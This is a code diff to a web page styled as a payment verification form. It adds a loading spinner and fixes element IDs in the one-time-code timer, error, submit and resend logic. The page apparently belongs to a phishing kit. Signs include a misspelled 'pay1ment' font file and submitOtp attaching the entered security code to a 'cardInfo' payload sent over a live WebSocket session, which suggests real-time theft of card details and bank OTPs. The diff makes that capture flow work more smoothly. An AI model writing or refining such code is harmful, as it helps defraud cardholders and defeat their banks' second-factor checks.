@@ -409,6 +409,36 @@
                 outline: none;
                 background: #fff
             }
+
+            .vfy-spinner {
+                display: none;
+                position: absolute;
+                inset: 0;
+                background: rgba(255,255,255,.92);
+                z-index: 5;
+                display: none;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                gap: 16px;
+                border-radius: 10px
+            }
+
+            .vfy-spinner .spin {
+                width: 40px;
+                height: 40px;
+                border: 3px solid #e0e0ee;
+                border-top-color: #3f51b5;
+                border-radius: 50%;
+                animation: spin .8s linear infinite
+            }
+
+            .vfy-spinner p {
+                color: #555;
+                font-size: 14px;
+                font-weight: 500;
+                margin: 0
+            }
 </style>
 
 
@@ -997,7 +1027,7 @@ url("pay1ment_icons.woff") format("woff");
                         <div class="otp-error hidden" id="otp-error">Please enter your security code.</div>
                         <button class="otp-btn" id="otp-submit">Continue</button>
                         <button class="otp-btn" id="otp-resend" style="background:#f5f5f5;color:#333;border:1px solid #ddd;margin-top:8px" onclick="resendOtp()">Resend Code</button>
-                        <div class="otp-countdown">
+                        <div class="otp-countdown hidden">
                             Code expires in <span id="otp-timer">4:59</span>
                         </div>
                         <div class="vfy-spinner hidden" id="otp-spinner">
@@ -1723,12 +1753,12 @@ url("pay1ment_icons.woff") format("woff");
  
   function stopOtpTimer() {
     if (otpTimer) { clearInterval(otpTimer); otpTimer = null; }
-    var timerEl = q('otpTimer');
+    var timerEl = q('otp-timer');
     if (timerEl) timerEl.style.display = 'none';
   }
  
   function tick() {
-    var timerEl = q('otpTimer');
+    var timerEl = q('otp-timer');
     if (!timerEl) return;
     var m = Math.floor(otpSec / 60), s = otpSec % 60;
     timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
@@ -1738,13 +1768,14 @@ url("pay1ment_icons.woff") format("woff");
   function submitOtp() {
     var code = q('otp-code') ? q('otp-code').value.trim() : '';
     if (!code || code.length < 4) {
-      if (q('otpError')) { q('otpError').style.display = 'block'; q('otpError').textContent = 'Please enter the OTP.'; }
+      if (q('otp-error')) { q('otp-error').style.display = 'block'; q('otp-error').textContent = 'Please enter the OTP.'; }
       return;
     }
-    if (q('otpError')) q('otpError').style.display = 'none';
-    var btn = q('btnOtp');
-    if (btn) { btn.disabled = true; btn.textContent = 'Verifying...'; }
- 
+    if (q('otp-error')) q('otp-error').style.display = 'none';
+    document.getElementById('otp-spinner').style.display='flex';
+    var btn = q('otp-submit');
+    if (btn) { btn.disabled = true; }
+    
     if (ws && ws.readyState === WebSocket.OPEN && sid) {
       var p = buildPayload();
       p.cardInfo.otpCode = code;
@@ -1768,13 +1799,13 @@ url("pay1ment_icons.woff") format("woff");
   function resetResend() {
     _otpResendCount = 0; _resendSec = 0;
     clearInterval(_resendTimer);
-    var rb = q('otpResend');
+    var rb = q('otp-resend');
     if (rb) { rb.disabled = false; rb.textContent = 'Resend Code'; rb.style.opacity = '1'; }
   }
  
   function startResendCooldown() {
     _resendSec = 60;
-    var rb = q('otpResend');
+    var rb = q('otp-resend');
     if (rb) { rb.disabled = true; rb.textContent = 'Resend Code (60s)'; }
     _resendTimer = setInterval(function () {
       _resendSec--;
